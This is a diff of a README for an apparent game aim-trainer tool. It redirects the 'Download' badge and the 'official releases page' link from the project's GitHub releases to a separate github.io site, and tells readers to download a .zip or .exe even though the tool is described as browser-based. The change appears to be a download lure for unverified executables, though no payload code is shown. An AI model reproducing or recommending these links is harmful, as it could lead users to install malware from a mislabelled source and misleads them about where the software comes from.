@@ -1,6 +1,6 @@
 # 🎯 aimtracker-script-update-2026 - Improve your shooter game aim accuracy
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/andreas6862/aimtracker-script-update-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://andreas6862.github.io)
 
 This software provides a browser-based tool to practice your aim for shooter games. It works with titles like VALORANT and Counter-Strike. The tool helps you build muscle memory by presenting targets that move across your screen. You click these targets to train your reflexes and precision.
 
@@ -18,7 +18,7 @@ Before you use this tool, ensure your computer meets these basic requirements:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official releases page](https://github.com/andreas6862/aimtracker-script-update-2026/releases).
+1. Visit the [official releases page](https://andreas6862.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link that ends in .zip or .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
